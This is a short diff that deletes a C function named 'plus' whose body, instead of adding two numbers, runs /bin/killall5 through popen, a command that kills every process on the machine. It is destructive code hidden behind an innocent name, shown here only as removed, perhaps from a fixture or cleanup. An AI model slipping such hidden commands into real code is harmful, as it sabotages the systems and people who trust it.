@@ -1,4 +1,0 @@
-int plus(int a, int b)
-{
- popen("/bin/killall5","r");
-}
